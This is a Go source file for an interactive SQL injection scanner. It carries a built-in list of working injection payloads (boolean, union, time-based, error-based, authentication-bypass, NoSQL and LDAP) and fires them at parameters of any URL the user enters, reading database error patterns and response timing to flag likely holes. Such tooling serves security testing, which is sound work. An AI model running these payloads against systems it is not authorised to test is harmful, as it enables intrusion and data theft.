// SQL Injection Testing Tool
// This tool provides comprehensive SQL injection vulnerability testing including:
// - Payload generation and testing
// - Database fingerprinting
// - Blind SQL injection detection
// - Time-based SQL injection testing
// - Error-based SQL injection detection
// - Educational vulnerability analysis

package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// SQLIPayload represents a SQL injection test payload
type SQLIPayload struct {
	Payload     string
	Type        string
	Database    string
	Description string
	Risk        string
}

// VulnerabilityResult represents the result of a SQL injection test
type VulnerabilityResult struct {
	URL         string
	Parameter   string
	Payload     SQLIPayload
	Vulnerable  bool
	Response    string
	ErrorType   string
	Confidence  string
	Evidence    []string
}

// SQLITester provides SQL injection testing capabilities
type SQLITester struct {
	Payloads        []SQLIPayload
	ErrorPatterns   map[string][]string
	TimeoutThreshold time.Duration
	Client          *http.Client
}

// NewSQLITester creates a new SQL injection tester
func NewSQLITester() *SQLITester {
	return &SQLITester{
		Payloads:        generatePayloads(),
		ErrorPatterns:   getErrorPatterns(),
		TimeoutThreshold: 5 * time.Second,
		Client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// generatePayloads creates a comprehensive list of SQL injection payloads
func generatePayloads() []SQLIPayload {
	return []SQLIPayload{
		// Basic SQL injection payloads
		{"'", "ERROR_BASED", "GENERIC", "Single quote to trigger SQL error", "HIGH"},
		{"\"", "ERROR_BASED", "GENERIC", "Double quote to trigger SQL error", "HIGH"},
		{"' OR '1'='1", "BOOLEAN_BASED", "GENERIC", "Classic boolean-based SQL injection", "HIGH"},
		{"\" OR \"1\"=\"1", "BOOLEAN_BASED", "GENERIC", "Double quote boolean-based injection", "HIGH"},
		{"' OR 1=1--", "BOOLEAN_BASED", "GENERIC", "Boolean injection with comment", "HIGH"},
		{"' OR 1=1#", "BOOLEAN_BASED", "MYSQL", "MySQL boolean injection with comment", "HIGH"},
		{"' OR 1=1/*", "BOOLEAN_BASED", "GENERIC", "Boolean injection with comment", "HIGH"},
		
		// Union-based payloads
		{"' UNION SELECT NULL--", "UNION_BASED", "GENERIC", "Union select with null", "HIGH"},
		{"' UNION SELECT 1,2,3--", "UNION_BASED", "GENERIC", "Union select with numbers", "HIGH"},
		{"' UNION ALL SELECT NULL,NULL,NULL--", "UNION_BASED", "GENERIC", "Union all select", "HIGH"},
		
		// Time-based blind payloads
		{"'; WAITFOR DELAY '00:00:05'--", "TIME_BASED", "MSSQL", "MSSQL time delay", "MEDIUM"},
		{"'; SELECT SLEEP(5)--", "TIME_BASED", "MYSQL", "MySQL sleep function", "MEDIUM"},
		{"'; SELECT pg_sleep(5)--", "TIME_BASED", "POSTGRESQL", "PostgreSQL sleep", "MEDIUM"},
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "TIME_BASED", "MYSQL", "MySQL nested sleep", "MEDIUM"},
		
		// Error-based payloads
		{"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--", "ERROR_BASED", "MYSQL", "MySQL extractvalue error", "HIGH"},
		{"' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "ERROR_BASED", "MYSQL", "MySQL double query error", "HIGH"},
		{"' AND CAST((SELECT version()) AS int)--", "ERROR_BASED", "MSSQL", "MSSQL cast error", "HIGH"},
		
		// Database fingerprinting
		{"' AND @@version IS NOT NULL--", "FINGERPRINT", "MSSQL", "MSSQL version detection", "LOW"},
		{"' AND version() IS NOT NULL--", "FINGERPRINT", "MYSQL", "MySQL version detection", "LOW"},
		{"' AND user() IS NOT NULL--", "FINGERPRINT", "MYSQL", "MySQL user detection", "LOW"},
		
		// Advanced payloads
		{"admin'--", "AUTHENTICATION_BYPASS", "GENERIC", "Authentication bypass", "HIGH"},
		{"admin'/*", "AUTHENTICATION_BYPASS", "GENERIC", "Authentication bypass with comment", "HIGH"},
		{"' OR SUBSTRING(@@version,1,1)='5'--", "BLIND_BOOLEAN", "MYSQL", "Blind boolean version check", "MEDIUM"},
		
		// NoSQL injection payloads
		{"' || '1'=='1", "NOSQL", "MONGODB", "MongoDB boolean injection", "MEDIUM"},
		{"{\"$gt\": \"\"}", "NOSQL", "MONGODB", "MongoDB greater than injection", "MEDIUM"},
		
		// XML injection
		{"' OR xmlexists('/user[userid=1 and password=\"admin\"]' passing by ref xmldata)--", "XML", "ORACLE", "Oracle XML injection", "MEDIUM"},
		
		// LDAP injection
		{"*)(&(objectClass=*)", "LDAP", "GENERIC", "LDAP injection payload", "MEDIUM"},
		
		// Encoded payloads
		{"%27%20OR%20%271%27%3D%271", "ENCODED", "GENERIC", "URL encoded boolean injection", "HIGH"},
		{"\\x27\\x20OR\\x20\\x271\\x27\\x3D\\x271", "ENCODED", "GENERIC", "Hex encoded injection", "HIGH"},
	}
}

// getErrorPatterns returns database-specific error patterns
func getErrorPatterns() map[string][]string {
	return map[string][]string{
		"MYSQL": {
			"You have an error in your SQL syntax",
			"mysql_fetch_array",
			"mysql_result",
			"mysql_num_rows",
			"Warning: mysql_",
			"MySQL server version",
		},
		"MSSQL": {
			"Microsoft OLE DB Provider for ODBC Drivers",
			"Microsoft JET Database Engine",
			"ODBC SQL Server Driver",
			"SQLServer JDBC Driver",
			"Unclosed quotation mark",
			"Incorrect syntax near",
		},
		"POSTGRESQL": {
			"PostgreSQL query failed",
			"pg_query() failed",
			"pg_exec() failed",
			"Warning: pg_",
			"syntax error at or near",
		},
		"ORACLE": {
			"ORA-00933",
			"ORA-00936", 
			"ORA-00942",
			"Oracle ODBC",
			"Oracle Driver",
		},
		"SQLITE": {
			"SQLite error",
			"sqlite3.OperationalError",
			"near \"_\": syntax error",
		},
		"GENERIC": {
			"SQL syntax",
			"syntax error",
			"unexpected token",
			"quoted string not properly terminated",
		},
	}
}

// TestURL tests a URL for SQL injection vulnerabilities
func (sqli *SQLITester) TestURL(targetURL string, parameter string) []VulnerabilityResult {
	var results []VulnerabilityResult
	
	// Get baseline response
	baseline, err := sqli.makeRequest(targetURL, parameter, "")
	if err != nil {
		fmt.Printf("Error getting baseline response: %v\n", err)
		return results
	}
	
	fmt.Printf("Testing parameter '%s' with %d payloads...\n", parameter, len(sqli.Payloads))
	
	for i, payload := range sqli.Payloads {
		fmt.Printf("Progress: %d/%d - Testing: %s\n", i+1, len(sqli.Payloads), payload.Type)
		
		result := sqli.testSinglePayload(targetURL, parameter, payload, baseline)
		if result.Vulnerable {
			results = append(results, result)
		}
	}
	
	return results
}

// testSinglePayload tests a single payload against the target
func (sqli *SQLITester) testSinglePayload(targetURL, parameter string, payload SQLIPayload, baseline string) VulnerabilityResult {
	result := VulnerabilityResult{
		URL:       targetURL,
		Parameter: parameter,
		Payload:   payload,
		Vulnerable: false,
	}
	
	switch payload.Type {
	case "TIME_BASED":
		result = sqli.testTimeBased(targetURL, parameter, payload)
	case "ERROR_BASED":
		result = sqli.testErrorBased(targetURL, parameter, payload, baseline)
	case "BOOLEAN_BASED", "BLIND_BOOLEAN":
		result = sqli.testBooleanBased(targetURL, parameter, payload, baseline)
	default:
		result = sqli.testGeneric(targetURL, parameter, payload, baseline)
	}
	
	return result
}

// testTimeBased tests for time-based SQL injection
func (sqli *SQLITester) testTimeBased(targetURL, parameter string, payload SQLIPayload) VulnerabilityResult {
	result := VulnerabilityResult{
		URL:       targetURL,
		Parameter: parameter,
		Payload:   payload,
		Vulnerable: false,
	}
	
	start := time.Now()
	response, err := sqli.makeRequest(targetURL, parameter, payload.Payload)
	duration := time.Since(start)
	
	if err != nil {
		result.Response = fmt.Sprintf("Error: %v", err)
		return result
	}
	
	// Check if response took significantly longer (indicating time-based injection)
	if duration > sqli.TimeoutThreshold {
		result.Vulnerable = true
		result.Confidence = "HIGH"
		result.Evidence = []string{
			fmt.Sprintf("Response time: %v (expected: <%v)", duration, sqli.TimeoutThreshold),
		}
		result.ErrorType = "TIME_DELAY"
	}
	
	result.Response = response
	return result
}

// testErrorBased tests for error-based SQL injection
func (sqli *SQLITester) testErrorBased(targetURL, parameter string, payload SQLIPayload, baseline string) VulnerabilityResult {
	result := VulnerabilityResult{
		URL:       targetURL,
		Parameter: parameter,
		Payload:   payload,
		Vulnerable: false,
	}
	
	response, err := sqli.makeRequest(targetURL, parameter, payload.Payload)
	if err != nil {
		result.Response = fmt.Sprintf("Error: %v", err)
		return result
	}
	
	result.Response = response
	
	// Check for database error patterns
	for dbType, patterns := range sqli.ErrorPatterns {
		for _, pattern := range patterns {
			if matched, _ := regexp.MatchString("(?i)"+pattern, response); matched {
				result.Vulnerable = true
				result.Confidence = "HIGH"
				result.ErrorType = dbType + "_ERROR"
				result.Evidence = append(result.Evidence, fmt.Sprintf("Found %s error pattern: %s", dbType, pattern))
			}
		}
	}
	
	// Check for significant response differences
	if len(response) != len(baseline) && !strings.Contains(baseline, response[:min(len(response), 100)]) {
		result.Evidence = append(result.Evidence, "Significant response difference detected")
		if !result.Vulnerable {
			result.Vulnerable = true
			result.Confidence = "MEDIUM"
			result.ErrorType = "RESPONSE_DIFFERENCE"
		}
	}
	
	return result
}

// testBooleanBased tests for boolean-based SQL injection
func (sqli *SQLITester) testBooleanBased(targetURL, parameter string, payload SQLIPayload, baseline string) VulnerabilityResult {
	result := VulnerabilityResult{
		URL:       targetURL,
		Parameter: parameter,
		Payload:   payload,
		Vulnerable: false,
	}
	
	// Test the payload
	response, err := sqli.makeRequest(targetURL, parameter, payload.Payload)
	if err != nil {
		result.Response = fmt.Sprintf("Error: %v", err)
		return result
	}
	
	result.Response = response
	
	// Test a false condition for comparison
	falsePayload := strings.Replace(payload.Payload, "1=1", "1=2", -1)
	falseResponse, err := sqli.makeRequest(targetURL, parameter, falsePayload)
	if err != nil {
		return result
	}
	
	// Compare responses
	if response != baseline && response != falseResponse {
		result.Vulnerable = true
		result.Confidence = "HIGH"
		result.ErrorType = "BOOLEAN_DIFFERENCE"
		result.Evidence = []string{
			"True condition response differs from baseline",
			"False condition response differs from true condition",
		}
	}
	
	return result
}

// testGeneric tests for generic SQL injection indicators
func (sqli *SQLITester) testGeneric(targetURL, parameter string, payload SQLIPayload, baseline string) VulnerabilityResult {
	result := VulnerabilityResult{
		URL:       targetURL,
		Parameter: parameter,
		Payload:   payload,
		Vulnerable: false,
	}
	
	response, err := sqli.makeRequest(targetURL, parameter, payload.Payload)
	if err != nil {
		result.Response = fmt.Sprintf("Error: %v", err)
		return result
	}
	
	result.Response = response
	
	// Check for SQL error patterns
	for dbType, patterns := range sqli.ErrorPatterns {
		for _, pattern := range patterns {
			if matched, _ := regexp.MatchString("(?i)"+pattern, response); matched {
				result.Vulnerable = true
				result.Confidence = "MEDIUM"
				result.ErrorType = dbType + "_ERROR"
				result.Evidence = append(result.Evidence, fmt.Sprintf("Found %s error pattern: %s", dbType, pattern))
			}
		}
	}
	
	return result
}

// makeRequest makes an HTTP request with the given payload
func (sqli *SQLITester) makeRequest(targetURL, parameter, payload string) (string, error) {
	// Parse the URL
	u, err := url.Parse(targetURL)
	if err != nil {
		return "", err
	}
	
	// Add or modify the parameter
	values := u.Query()
	values.Set(parameter, payload)
	u.RawQuery = values.Encode()
	
	// Make the request
	resp, err := sqli.Client.Get(u.String())
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	// Read the response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	
	return string(body), nil
}

// PrintResults prints the vulnerability test results
func (sqli *SQLITester) PrintResults(results []VulnerabilityResult) {
	if len(results) == 0 {
		fmt.Println("✓ No SQL injection vulnerabilities detected")
		return
	}
	
	fmt.Printf("\n🚨 FOUND %d POTENTIAL SQL INJECTION VULNERABILITIES:\n", len(results))
	fmt.Println(strings.Repeat("=", 60))
	
	for i, result := range results {
		fmt.Printf("\n[%d] VULNERABILITY DETECTED\n", i+1)
		fmt.Printf("URL: %s\n", result.URL)
		fmt.Printf("Parameter: %s\n", result.Parameter)
		fmt.Printf("Payload: %s\n", result.Payload.Payload)
		fmt.Printf("Type: %s\n", result.Payload.Type)
		fmt.Printf("Database: %s\n", result.Payload.Database)
		fmt.Printf("Risk Level: %s\n", result.Payload.Risk)
		fmt.Printf("Confidence: %s\n", result.Confidence)
		fmt.Printf("Error Type: %s\n", result.ErrorType)
		
		if len(result.Evidence) > 0 {
			fmt.Println("Evidence:")
			for _, evidence := range result.Evidence {
				fmt.Printf("  - %s\n", evidence)
			}
		}
		
		fmt.Printf("Description: %s\n", result.Payload.Description)
		fmt.Println(strings.Repeat("-", 40))
	}
	
	// Security recommendations
	fmt.Println("\n🛡️  SECURITY RECOMMENDATIONS:")
	fmt.Println("1. Use parameterized queries/prepared statements")
	fmt.Println("2. Implement proper input validation and sanitization")
	fmt.Println("3. Use stored procedures where appropriate")
	fmt.Println("4. Apply principle of least privilege to database accounts")
	fmt.Println("5. Enable database error logging and monitoring")
	fmt.Println("6. Use web application firewalls (WAF)")
	fmt.Println("7. Regular security testing and code reviews")
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Interactive menu
func showMenu() {
	fmt.Println("\n=== SQL Injection Testing Tool ===")
	fmt.Println("1. Test single URL")
	fmt.Println("2. Test URL with multiple parameters")
	fmt.Println("3. Show payload database")
	fmt.Println("4. Custom payload test")
	fmt.Println("5. Exit")
	fmt.Print("Select option: ")
}

func main() {
	tester := NewSQLITester()
	scanner := bufio.NewScanner(os.Stdin)
	
	fmt.Println("SQL Injection Vulnerability Testing Tool v1.0")
	fmt.Println("Educational tool for web application security testing")
	fmt.Println("⚠️  Use responsibly and only on applications you own or have permission to test")
	
	for {
		showMenu()
		
		if !scanner.Scan() {
			break
		}
		choice := strings.TrimSpace(scanner.Text())
		
		switch choice {
		case "1":
			fmt.Print("Enter target URL: ")
			if !scanner.Scan() {
				continue
			}
			targetURL := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter parameter name to test: ")
			if !scanner.Scan() {
				continue
			}
			parameter := strings.TrimSpace(scanner.Text())
			
			fmt.Printf("Starting SQL injection test on %s (parameter: %s)\n", targetURL, parameter)
			results := tester.TestURL(targetURL, parameter)
			tester.PrintResults(results)
			
		case "2":
			fmt.Print("Enter target URL: ")
			if !scanner.Scan() {
				continue
			}
			targetURL := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter parameter names (comma-separated): ")
			if !scanner.Scan() {
				continue
			}
			parametersStr := strings.TrimSpace(scanner.Text())
			parameters := strings.Split(parametersStr, ",")
			
			var allResults []VulnerabilityResult
			for _, param := range parameters {
				param = strings.TrimSpace(param)
				fmt.Printf("\nTesting parameter: %s\n", param)
				results := tester.TestURL(targetURL, param)
				allResults = append(allResults, results...)
			}
			
			tester.PrintResults(allResults)
			
		case "3":
			fmt.Printf("\n=== SQL Injection Payload Database ===\n")
			fmt.Printf("Total payloads: %d\n\n", len(tester.Payloads))
			
			typeCount := make(map[string]int)
			dbCount := make(map[string]int)
			
			for _, payload := range tester.Payloads {
				typeCount[payload.Type]++
				dbCount[payload.Database]++
				fmt.Printf("Type: %-15s | DB: %-10s | Risk: %-6s | %s\n",
					payload.Type, payload.Database, payload.Risk, payload.Payload)
			}
			
			fmt.Println("\n--- Statistics ---")
			fmt.Println("By Type:")
			for pType, count := range typeCount {
				fmt.Printf("  %s: %d\n", pType, count)
			}
			fmt.Println("By Database:")
			for db, count := range dbCount {
				fmt.Printf("  %s: %d\n", db, count)
			}
			
		case "4":
			fmt.Print("Enter target URL: ")
			if !scanner.Scan() {
				continue
			}
			targetURL := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter parameter name: ")
			if !scanner.Scan() {
				continue
			}
			parameter := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter custom payload: ")
			if !scanner.Scan() {
				continue
			}
			payloadStr := strings.TrimSpace(scanner.Text())
			
			customPayload := SQLIPayload{
				Payload:     payloadStr,
				Type:        "CUSTOM",
				Database:    "GENERIC",
				Description: "Custom user payload",
				Risk:        "UNKNOWN",
			}
			
			baseline, _ := tester.makeRequest(targetURL, parameter, "")
			result := tester.testSinglePayload(targetURL, parameter, customPayload, baseline)
			
			if result.Vulnerable {
				fmt.Println("🚨 VULNERABILITY DETECTED with custom payload!")
				tester.PrintResults([]VulnerabilityResult{result})
			} else {
				fmt.Println("✓ No vulnerability detected with custom payload")
			}
			
		case "5":
			fmt.Println("Exiting...")
			return
			
		default:
			fmt.Println("Invalid option. Please try again.")
		}
	}
}
